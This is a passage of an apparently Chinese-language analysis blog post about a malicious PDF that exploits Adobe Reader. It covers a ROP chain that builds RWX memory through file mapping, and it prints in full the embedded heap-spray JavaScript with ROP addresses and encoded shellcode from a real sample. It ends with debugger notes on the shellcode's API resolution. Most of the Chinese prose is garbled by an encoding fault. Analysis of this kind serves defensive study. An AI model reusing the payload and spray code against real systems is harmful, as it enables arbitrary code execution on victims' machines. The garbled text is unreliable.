<p>æ‰§è¡Œå®Œæ¯•ä½¿ç”¨ctrl + F9,å†æ¬¡è·³è½¬åˆ°ç»“å°¾ï¼Œå‘ç°åŒä¹‹å‰ä¸€æ ·ï¼Œäº¤æ¢<code>eax</code>å’Œ<code>edi</code>ï¼Œä¹Ÿå°±æ˜¯åˆ›å»ºæ–‡ä»¶æ˜ å°„çš„å¥æŸ„ç»™åˆ°äº†<code>edi</code><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/2f738bd4b31c870112789c2c627f9e2f0608ff2a.jpg"
                     
                ></p>
<p>ç„¶ååŒä¹‹å‰ä¸Šé¢ä¸€æ ·çš„æ“ä½œï¼Œé€šè¿‡å¸ƒç½®å¥½çš„ROPé“¾æ¥æ‰§è¡Œ<code>MapViewOfFile</code>ï¼Œç›´æ¥æ è¿‡è¿™é‡Œè°ƒè¯•ï¼Œè·Ÿä¸Šé¢ä¸¤ä¸ªå‡½æ•°ä¸€æ ·ï¼Œæ²¡ä»€ä¹ˆå¥½è¯´çš„<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/4610b912c8fcc3ceaaf8e0f9d745d688d43f203b.jpg"
                     
                ></p>
<p>å¯ä»¥çœ‹åˆ°ä¸Šé¢å›¾ç‰‡ä¸­è°ƒç”¨<code>MapViewOfFile</code>å‡½æ•°çš„å‚æ•°ï¼Œè°ƒç”¨è¯¥å‡½æ•°åï¼Œä¼šè¿”å›è¯¥æ–‡ä»¶å¯¹è±¡åœ¨å†…å­˜å½“ä¸­å¯¹åº”çš„åœ°å€<br>è¯¥å‡½æ•°è¿”å›åå¦‚ä¸‹ï¼š<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/dbb44aed2e738bd403059bfbe48b87d6267ff9d0.jpg"
                     
                ></p>
<p>å…¶ä¸­<code>eax</code>å³ä¸ºæ–‡ä»¶å¯¹è±¡åœ¨å†…å­˜ä¸­çš„åœ°å€ä¸º0x048D0000<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/d50735fae6cd7b891d6813494a2442a7d8330ef7.jpg"
                     
                ></p>
<p>ä¸éš¾çœ‹å‡ºè¿™å—æ˜ å°„åŒºRWEæƒé™å‡æœ‰ï¼Œä¹‹åçš„è°ƒè¯•å°±ä¼šå°†æ–‡ä»¶å†…å­˜åœ°å€å­˜æ”¾åœ¨0x4A8A004çš„åœ°å€äº†ï¼Œå¦‚ä¸‹<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/37d12f2eb9389b506c8bc998c035e5dde6116e87.jpg"
                     
                ></p>
<p>åœ¨<code>retn</code>çš„åœ°å€å­˜æ”¾è¯¥0x48D0000,æ–¹ä¾¿ROPé“¾è¿”å›<br>ä»¥åŒæ ·çš„æ‰‹æ®µæ‰§è¡Œ<code>memcpy</code>å‡½æ•°<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/342ac65c10385343fa88aeebd613b07ecb8088b0.jpg"
                     
                ></p>
<p>å¯ä»¥çœ‹åˆ°å…¶ä¸­ç›®çš„åœ°å€æ˜¯0x048D0000,è€Œ0x0c0c0D54å­˜æ”¾ç€æ¶æ„ä»£ç </p>
<p>ä½¿ç”¨ctrl + F9æ¥è·³åˆ°æ‰§è¡Œå‡½æ•°ç»“æŸï¼Œå¦‚ä¸‹ï¼š<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/09fa513d269759eeefe94901f7fb43166c22dfbb.jpg"
                     
                ></p>
<p>å¯ä»¥çœ‹åˆ°æ–‡ä»¶å¯¹è±¡çš„å†…å­˜åœ°å€å¤„å·²ç»æ‹·è´è¿‡å»äº†å¤§é‡æ¶æ„ä»£ç ï¼Œå¹¶ä¸”<code>retn</code>æ˜¯ç›´æ¥è¿”å›åˆ°0x048D00è¿™é‡Œï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªæ–‡ä»¶å¤„æ‰§è¡Œï¼Œè€Œå› ä¸ºè¿™ä¸ªæ–‡ä»¶æœ‰RWXæƒé™ï¼Œæ‰€ä»¥è¯´å¯ä»¥æ‰§è¡Œè¯¥æ–‡ä»¶æ¶æ„ä»£ç ã€‚</p>
<p>å› æ­¤ä»ROPé“¾åˆ°æ‰§è¡Œæ¶æ„ä»£ç ï¼Œåˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š</p>
<ol>
<li>åˆ©ç”¨æº¢å‡ºæ¥æ„é€ ROPé“¾,ROPé“¾é€šè¿‡å¸ƒç½®ä¸å¸¦ALSRçš„åº“ä¸­gadgetæ¥ç»•è¿‡æ­¤æœºåˆ¶,é€šè¿‡ä¸¤æ¬¡æ ˆè¿ç§»æ¥åˆ°è¾¾0x0C0C0C0C,é€šè¿‡å †å–·åœ¨è¿™é‡Œæ„é€ å¥½æ ˆæ•°æ®å’Œæ¶æ„ä»£ç </li>
<li>è°ƒç”¨CreateFileAå‡½æ•°,åˆ›å»ºios88591è¿™ä¸ªæ–‡ä»¶</li>
<li>è°ƒç”¨CreateFileMappingAå‡½æ•°,æ„é€ è¯¥æ–‡ä»¶åœ¨å†…å­˜ä¸­çš„æ˜ å°„</li>
<li>è°ƒç”¨MapviewOfFileå‡½æ•°,è¿”å›è¯¥æ–‡ä»¶æ˜ å°„åœ¨å†…å­˜ä¸­çš„åœ°å€,ä¸Šé¢3æ­¥æ˜¯ä¸ºäº†æ„é€ ä¸€å—å¯æ‰§è¡Œå¯è¯»å¯å†™çš„å†…å­˜åŒºåŸŸ</li>
<li>è°ƒç”¨memcpy,æ¥å°†æ¶æ„ä»£ç å­˜æ”¾åˆ°è¯¥æ–‡ä»¶æ˜ å°„å½“ä¸­</li>
<li>è·³è½¬åˆ°æ¶æ„ä»£ç æ‰§è¡Œ</li>
</ol>
<h2 id="6-å †å–·-Heap-Spray"><a href="#6-å †å–·-Heap-Spray" class="headerlink" title="6.å †å–·(Heap Spray)"></a>6.å †å–·(Heap Spray)</h2><p>åˆ©ç”¨pdfä¸­å†…åµŒçš„javascriptæ¥ç”³è¯·ï¼Œé¦–å…ˆç”³è¯·ä¸ª200MBçš„å†…å­˜ï¼Œè€Œä¸€èˆ¬åˆ†é…å†…å­˜éƒ½æ˜¯ä»ä½åœ°å€å¼€å§‹åˆ†é…ï¼Œå› æ­¤å¤§æ¦‚ç‡0x0c0c0c0cä¼šè¢«åŒ…å«åœ¨å…¶ä¸­ï¼Œè€Œè¿™é‡Œä¸€èˆ¬ä¼šåœ¨å‰é¢çš„éƒ¨åˆ†å¤§é‡å¡«å……0x90ï¼Œè¡¨ç¤ºNOPæŒ‡ä»¤(ä¹Ÿå°±æ˜¯é›ªæ©‡)å¦‚æœROPåˆ°0x0c0c0c0cï¼Œå°±ä¼šé€šè¿‡è¯¥é›ªæ©‡æ»‘å‘å¸ƒç½®çš„ROPé“¾ä¸Šã€‚ï¼ˆæ‡’å¾—ç”»ç»“æ„å›¾ï¼Œå·äº†ä¸€ä¸ªï¼‰<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/0df431adcbef760958c9b0556bdda3cc7dd99e3d.jpg"
                     
                ></p>
<p>å¯ä»¥é€šè¿‡PdfStreamDumperæ¥è§£æpdfæ–‡ä»¶ï¼Œä»ä¸­æå–å‡ºJavaScriptä»£ç ï¼Œå¦‚ä¸‹ï¼š</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = <span class="built_in">unescape</span>(<span class="string">&quot;%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000&quot;</span> +</span><br><span class="line"><span class="string">&quot;\x25\x7530e8\x25\x750000\x25\x75ad00\x25\x757d9b\x25\x75acdf\x25\x75da08\x25\x751676\x25\x75fa65&quot;</span> +</span><br><span class="line"><span class="string">&quot;%uec10%u0397%ufb0c%ufd97%u330f%u8aca%uea5b%u8a49&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ud9e8%u238a%u98e9%u8afe%u700e%uef73%uf636%ub922&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u7e7c%ue2d8%u5b73%u8955%u81e5%u48ec%u0002%u8900&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ufc5d%u306a%u6459%u018b%u408b%u8b0c%u1c70%u8bad&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u0858%u0c6a%u8b59%ufc7d%u5351%u74ff%ufc8f%u8de8&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u0002%u5900%u4489%ufc8f%ueee2%u016a%u8d5e%uf445&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u5650%u078b%ud0ff%u4589%u3df0%uffff%uffff%u0475&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u5646%ue8eb%u003d%u0020%u7700%u4604%ueb56%u6add&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u6a00%u6800%u1200%u0000%u8b56%u0447%ud0ff%u006a&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u458d%u50ec%u086a%u458d%u50b8%u8b56%u0847%ud0ff&quot;</span> +</span><br><span class="line"><span class="string">&quot;%uc085%u0475%u5646%ub4eb%u7d81%u50b8%u5064%u7444&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u4604%ueb56%u81a7%ubc7d%ufeef%uaeea%u0474%u5646&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u9aeb%u75ff%u6af0%uff40%u0c57%u4589%u85d8%u75c0&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ue905%u0205%u0000%u006a%u006a%u006a%uff56%u0457&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u006a%u458d%u50ec%u75ff%ufff0%ud875%uff56%u0857&quot;</span> +</span><br><span class="line"><span class="string">&quot;%uc085%u0575%ue2e9%u0001%u5600%u57ff%u8b10%ud85d&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u838b%u1210%u0000%u4589%u8be8%u1483%u0012%u8900&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ue445%u838b%u1218%u0000%u4589%u03e0%ue445%u4503&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u89e8%udc45%u8a48%u0394%u121c%u0000%uc230%u9488&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u1c03%u0012%u8500%u77c0%u8deb%ub885%ufffe%u50ff&quot;</span> +</span><br><span class="line"><span class="string">&quot;%uf868%u0000%uff00%u1457%ubb8d%u121c%u0000%uc981&quot;</span> +</span><br><span class="line"><span class="string">&quot;%uffff%uffff%uc031%uaef2%ud1f7%ucf29%ufe89%uca89&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ubd8d%ufeb8%uffff%uc981%uffff%uffff%uaef2%u894f&quot;</span> +</span><br><span class="line"><span class="string">&quot;%uf3d1%u6aa4%u8d02%ub885%ufffe%u50ff%u7d8b%ufffc&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u1857%uff3d%uffff%u75ff%ue905%u014d%u0000%u4589&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u89c8%uffc2%ue875%u838d%u121c%u0000%u4503%u50e0&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ub952%u0100%u0000%u548a%ufe48%u748a%uff48%u7488&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ufe48%u5488%uff48%ueee2%u57ff%uff1c%uc875%u57ff&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u8d10%ub885%ufffe%ue8ff%u0000%u0000%u0481%u1024&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u0000%u6a00%u5000%u77ff%uff24%u2067%u57ff%u8924&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ud045%uc689%uc789%uc981%uffff%uffff%uc031%uaef2&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ud1f7%u8949%ucc4d%ubd8d%ufeb8%uffff%u0488%u490f&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u048a%u3c0e%u7522%u491f%u048a%u3c0e%u7422%u8807&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u0f44%u4901%uf2eb%ucf01%uc781%u0002%u0000%u7d89&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ue9c0%u0013%u0000%u048a%u3c0e%u7420%u8806%u0f04&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ueb49%u01f3%u47cf%u7d89%uffc0%uf075%u406a%u558b&quot;</span> +</span><br><span class="line"><span class="string">&quot;%ufffc%u0c52%u4589%u89d4%u8bc7%ue875%u7503%u01e0&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u81de%u1cc6%u0012%u8b00%ue44d%ua4f3%u7d8b%u6afc&quot;</span> +</span><br><span class="line"><span class="string">&quot;%uff00%uc075%u57ff%u8918%uc445%uff3d%uffff%u74ff&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u576a%uc389%u75ff%ufff0%ud475%uff50%u1c57%uff53&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u1057%u7d8b%u81c0%uffc9%uffff%u31ff%uf2c0%uf7ae&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u29d1%u89cf%u8dfe%ub8bd%ufffd%uc7ff%u6307%u646d&quot;</span> +</span><br><span class="line"><span class="string">&quot;%uc72e%u0447%u7865%u2065%u47c7%u2f08%u2063%u8122&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u0cc7%u0000%uf300%u4fa4%u07c6%u4722%u07c6%u5f00&quot;</span> +</span><br><span class="line"><span class="string">&quot;\x25\x75858d\x25\x75fdb8\x25\x75ffff\x25\x7500e8\x25\x750000\x25\x758100\x25\x752404\x25\x750010&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u0000%u006a%uff50%u2477%u67ff%u6a20%uff00%u2c57&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u5553%u5756%u6c8b%u1824%u458b%u8b3c%u0554%u0178&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u8bea%u184a%u5a8b%u0120%ue3eb%u4932%u348b%u018b&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u31ee%ufcff%uc031%u38ac%u74e0%uc107%u0dcf%uc701&quot;</span> +</span><br><span class="line"><span class="string">&quot;%uf2eb%u7c3b%u1424%ue175%u5a8b%u0124%u66eb%u0c8b&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u8b4b%u1c5a%ueb01%u048b%u018b%uebe8%u3102%u89c0&quot;</span> +</span><br><span class="line"><span class="string">&quot;%u5fea%u5d5e%uc25b%u0008&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">// unescape(&quot;%u0c0c%u0c0c&quot;); æ»‘å—ä»£ç  0x0c ç­‰äºæŒ‡ä»¤ OR al, 0C; å¤§é‡æ‰§è¡Œå¯¹ shellcode æ— å½±å“</span></span><br><span class="line"><span class="keyword">var</span> nop_chip = <span class="built_in">unescape</span>(<span class="string">&quot;\x25\x750c0c\x25\x750c0c&quot;</span>);</span><br><span class="line"><span class="comment">// 65536 ç­‰äº 0x10000 ç­‰äº 2 ^ 16 ç­‰äº 64KB, è¿™é‡Œçš„ 20+8 åº”è¯¥æ˜¯ç”¨æ¥å…æ€ç”¨çš„ï¼Œæ— å®é™…ä½œç”¨</span></span><br><span class="line"><span class="keyword">while</span> (nop_chip.<span class="property">length</span> + <span class="number">20</span> + <span class="number">8</span> &lt; <span class="number">65536</span>)</span><br><span class="line">    nop_chip += nop_chip;</span><br><span class="line"><span class="comment">// ç²¾å‡†å †å–·ï¼Œä½¿ shellcode å¼€å§‹çš„åœ°æ–¹ä¸€å®šåœ¨ 0c0c ç»“å°¾çš„åœ°å€ 0x....0c0c å¤„</span></span><br><span class="line">temp_chip = nop_chip.<span class="title function_">substring</span>(<span class="number">0</span>, (<span class="number">0x0c0c</span> - <span class="number">0x24</span>) / <span class="number">2</span>);</span><br><span class="line">temp_chip += shellcode; <span class="comment">//æ‹¼æ¥ä¸Š shellcodeï¼Œè¯¥ä½ç½®ä¸€å®šåœ¨ 0c0c ç»“å°¾çš„åœ°å€å¤„</span></span><br><span class="line">temp_chip += nop_chip; <span class="comment">//æ‹¼æ¥åç»­çš„æ»‘å—ä»£ç  </span></span><br><span class="line"><span class="comment">// shellcode å°ç‰‡æ®µä¸€ä¸ªæ˜¯ 0x10000 å¤§å°ï¼Œunicode ä¸€ä¸ªé•¿åº¦ç­‰äº2å­—èŠ‚ï¼Œ0x10000å®é™…æ˜¯ 0x20000 å­—èŠ‚å¤§å°ï¼Œé™¤2 ä¸º 0x10000</span></span><br><span class="line">small_shellcode_slide = temp_chip.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">65536</span> / <span class="number">2</span>);</span><br><span class="line"><span class="comment">// æœ€ç»ˆä¸€ä¸ªshellcodeå®é™…å¤§å°ä¸º 1MBï¼Œ0x80000 * 2 = 0x100000 = 1MB</span></span><br><span class="line"><span class="keyword">while</span> (small_shellcode_slide.<span class="property">length</span> &lt; <span class="number">0x80000</span>)</span><br><span class="line">    small_shellcode_slide += small_shellcode_slide;</span><br><span class="line"><span class="comment">// ä»åé¢æˆªçŸ­ 0x1020 - 0x08 = 4120 å­—èŠ‚ï¼Œç›®çš„åº”è¯¥æ˜¯è®©å®é™…å¤§å°å°äº1MBï¼Œå› ä¸ºè¿™é‡Œåˆ†é…çš„ä¸€ä¸ªå †å—æ˜¯1MBå¤§å°ï¼Œshellcode_slide åº”è¯¥å°äºå †å—å¤§å°</span></span><br><span class="line">shellcode_slide = small_shellcode_slide.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">0x80000</span> - (<span class="number">0x1020</span> - <span class="number">0x08</span>) / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> slide = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line"><span class="comment">// 0x1f0 ç­‰äº 496 ï¼Œä¹Ÿå°±æ˜¯åœ¨å†…å­˜ä¸­ç”³è¯·äº†æ¥è¿‘ 500 MB çš„å†…å­˜</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x1f0</span>; i++) </span><br><span class="line">    slide[i] = shellcode_slide + <span class="string">&quot;s&quot;</span>;<span class="comment">// s å­—ç¬¦æ— å®é™…ä½œç”¨ï¼Œä¼°è®¡ç”¨äºå…æ€</span></span><br></pre></td></tr></table></figure></div>

<p>å¯ä»¥çœ‹åˆ°ä¸Šé¢ä»£ç é¦–å…ˆæ˜¯æ„é€ ä¸€ä¸ªé“¾æ¡</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> nop_chip = <span class="built_in">unescape</span>(<span class="string">&quot;\x25\x750c0c\x25\x750c0c&quot;</span>);</span><br><span class="line"><span class="comment">// 65536 ç­‰äº 0x10000 ç­‰äº 2 ^ 16 ç­‰äº 64KB, è¿™é‡Œçš„ 20+8 åº”è¯¥æ˜¯ç”¨æ¥å…æ€ç”¨çš„ï¼Œæ— å®é™…ä½œç”¨</span></span><br><span class="line"><span class="keyword">while</span> (nop_chip.<span class="property">length</span> + <span class="number">20</span> + <span class="number">8</span> &lt; <span class="number">65536</span>)</span><br><span class="line">    nop_chip += nop_chip;</span><br></pre></td></tr></table></figure></div>

<p>ä¸Šè¿°ä»£ç å¯ä»¥è¿‘ä¼¼çœ‹ä½œæ‹¼æ¥å¤§é‡<code>nop</code>æŒ‡ä»¤ï¼Œç„¶åç²¾å‡†å †å–·ï¼Œè¿™é‡Œæˆªå–ä¸€ä¸‹æ„é€ é“¾æ¡ï¼Œä½¿å¾—<code>shellcode</code>èƒ½è¢«å­˜æ”¾åœ¨0x****0c0c,è¿™é‡Œå‡å»0x24ï¼Œæ˜¯å› ä¸ºå †å¤´éƒ¨ä¼šå æ®0x20å­—èŠ‚ï¼Œç„¶åshellcodeé¦–éƒ¨æ·»åŠ äº†4ä¸ªâ€˜Aâ€™</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ç²¾å‡†å †å–·ï¼Œä½¿ shellcode å¼€å§‹çš„åœ°æ–¹ä¸€å®šåœ¨ 0c0c ç»“å°¾çš„åœ°å€ 0x....0c0c å¤„</span></span><br><span class="line">temp_chip = nop_chip.<span class="title function_">substring</span>(<span class="number">0</span>, (<span class="number">0x0c0c</span> - <span class="number">0x24</span>) / <span class="number">2</span>);</span><br><span class="line">temp_chip += shellcode; <span class="comment">//æ‹¼æ¥ä¸Š shellcodeï¼Œè¯¥ä½ç½®ä¸€å®šåœ¨ 0c0c ç»“å°¾çš„åœ°å€å¤„</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/472309f790529822ae6a110992ca7bcb0b46d49b.jpg"
                     
                ></p>
<h2 id="7-æ¶æ„æ ·æœ¬åˆ†æ"><a href="#7-æ¶æ„æ ·æœ¬åˆ†æ" class="headerlink" title="7.æ¶æ„æ ·æœ¬åˆ†æ"></a>7.æ¶æ„æ ·æœ¬åˆ†æ</h2><p>å·²ç»å®Œæˆäº†æ ·æœ¬åˆ†æè¿‡ç¨‹ï¼Œæ¥ä¸‹æ¥çœ‹çœ‹æ¶æ„ä»£ç çš„è°ƒè¯•åˆ†æï¼Œé¦–å…ˆæ˜¯è°ƒè¯•ç•Œé¢ï¼Œä¹‹å‰ä½¿ç”¨çš„åˆ†ææ ·æœ¬æ˜¯ç®€å•çš„æ‰§è¡Œä¸€ä¸ªè®¡ç®—å™¨çš„æ‰“å°ï¼Œä½†æ˜¯è¿™é‡Œæ‹¿çœŸæ­£çš„æ¶æ„æ ·æœ¬æ¥è¿›è¡Œåˆ†æï¼Œåå­—æ˜¯ä¸€ä¸ªåä¼é¢è¯•è‡ªåŠ©æ‰‹å†Œ<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/0b55b319ebc4b745d9899cdc8afc1e178b8215de.jpg"
                     
                ></p>
<p>æ­¤æ—¶åƒä¹‹å‰æ¼æ´åˆ†æä¸€æ ·ç›´æ¥è¿è¡Œåˆ°æ¶æ„ä»£ç å¤„ï¼Œè¿™é‡Œæ˜¯calläº†ä¸€ä¸ªå€¼ï¼Œæ­¥å…¥æŸ¥çœ‹</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/48540923dd54564ed271cff3f6de9c82d0584fe7.jpg"
                     
                ></p>
<p>æ¶æ„ä»£ç ä¼šä» <code>kernel32.dll</code> ä¸­è·å–æƒ³è¦è°ƒç”¨çš„å‡½æ•°åœ°å€ã€‚é¦–å…ˆè·å–äº†<code> kernel32.dll</code> çš„åŸºåœ°å€ï¼Œ0x4930044 å¤„å…ˆèµ‹å€¼ <code>ecx</code> ä¸º 0x30 ï¼Œfs[0x30] å¤„å³ä¸ºè¿›ç¨‹ç¯å¢ƒå—<code> PEB</code> çš„æŒ‡é’ˆï¼Œé€šè¿‡ PEB + 0xC åç§»å¤„è·å–<code>PEB_LDR_DATA</code> ç»“æ„ä½“æŒ‡é’ˆï¼Œ<code>PEB_LDR_DATA</code> åç§» 0x1C å¤„è·å–<code>InInitializationOrderModuleList</code>æˆå‘˜æŒ‡é’ˆï¼Œ<code>lods [esi] </code>è·å–åŒå‘é“¾è¡¨å½“å‰èŠ‚ç‚¹çš„åç»§æŒ‡é’ˆ, æŒ‡å‘<code> kernel32.dll</code> èŠ‚ç‚¹ï¼Œæ‰¾åˆ°å±äº<code>kernel32.dll</code>çš„ç»“ç‚¹åï¼Œåœ¨å…¶åŸºç¡€ä¸Šå†åç§»0x08å°±æ˜¯<code>kernel32.dll</code>åœ¨å†…å­˜ä¸­çš„åŠ è½½åŸºåœ°å€ã€‚è·å–åŠ è½½åŸºåœ°å€ä¸º 0x7C800000 ï¼Œä¿å­˜åœ¨ <code>ebx</code> ä¸­ï¼Œå¦‚ä¸‹å›¾ï¼š<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/4034970a304e251fc182cf32e286c9177e3e5386.jpg"
                     
                ></p>
<p>è€Œä¸Šå›¾ä¸­å³å°†å‹å…¥æ ˆçš„0xCæ˜¯å³å°†å¯»æ‰¾çš„å‡½æ•°æ•°é‡ï¼Œè€Œä¸Šå›¾ä¸­ä¼šè¿è¡Œåˆ°ä¸€ä¸ªcallå‡½æ•°ï¼Œæ­¥å…¥å¦‚ä¸‹ï¼š<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/738b4710b912c8fca5afdd07b9039245d788219f.jpg"
                     
                ></p>
<p>æ ˆä¸Šç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç¬¬ä¸€ä¸ªå‡½æ•°çš„hashï¼Œç¬¬äºŒä¸ªä¸º<code>kernel32.dll</code>çš„åŸºåœ°å€ï¼Œç„¶å0x49302f8åœ°å€æŒ‡ä»¤ä¼šå°†è¯¥åŸºåœ°å€åç§»0x3cçš„å€¼èµ‹ç»™<code>eax</code>ï¼Œè¿™ä¸ª0x3cæ˜¯PEå¤´éƒ¨åç§»é‡çš„å­˜å‚¨ä½ç½®ï¼Œåœ¨PEå¤´éƒ¨åç§»0x78å¤„ï¼Œä¹Ÿå°±æ˜¯<code>kernel32.dll</code>å¯¼å‡ºè¡¨çš„è™šæ‹Ÿåœ°å€0x262cèµ‹å€¼ç»™<code>edx</code><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/1c950a7b02087bf4ca527c23b7d3572c10dfcfba.jpg"
                     
                ></p>
<p>æ­¤æ—¶<code>edx</code>æ˜¯å­˜æ”¾ç€<code>kernel32.dll</code>å¯¼å‡ºè¡¨çš„è™šæ‹Ÿåœ°å€çš„,å†å°†åç§»0x18å’Œ0x20çš„å€¼åˆ†åˆ«å­˜æ”¾åœ¨<code>ecx</code>å’Œ<code>ebx</code>ä¸­ï¼Œè¿™é‡Œçš„åç§»åˆ†åˆ«ä¿å­˜ç€å¯¼å‡ºè¡¨å‡½æ•°çš„æ•°ç›®å’Œå¯¼å‡ºè¡¨å‡½æ•°åç§°è¡¨çš„åœ°å€åç§»</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/6a63f6246b600c3361d7f5025f4c510fd8f9a14a.jpg"
                     
                ></p>
<p>ç„¶åç»§ç»­å•æ­¥ï¼Œå‘ç°åœ¨0x493030F,è¿™é‡Œæ˜¯å°†å‡½æ•°è¡¨ä¸­æœ€åä¸€ä¸ªå‡½æ•°åç§°åœ°å€æ”¾å…¥<code>esi</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/7a899e510fb30f24c604c7c98d95d143ac4b0359.jpg"
                     
                ></p>
<p>å¯ä»¥çœ‹åˆ°ä¸Šé¢æ”¾å…¥<code>esi</code>çš„å‡½æ•°åæ˜¯<code>IstrenW</code>,ç„¶åæˆ‘ä»¬åœ¨0x493031Bå¤„æ ¹æ®å‡½æ•°åè®¡ç®—hashï¼Œç„¶ååŒä¹‹å‰æˆ‘ä»¬å‹æ ˆçš„hash([esp + 0x14])è¿›è¡Œæ¯”è¾ƒï¼Œè‹¥ç›¸åŒåˆ™ç»§ç»­å¾€ä¸‹èµ°<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://imgsrc.baidu.com/forum/pic/item/fcfaaf51f3deb48fa3fb8a14b51f3a292cf5786d.jpg"
                     
                ></p>
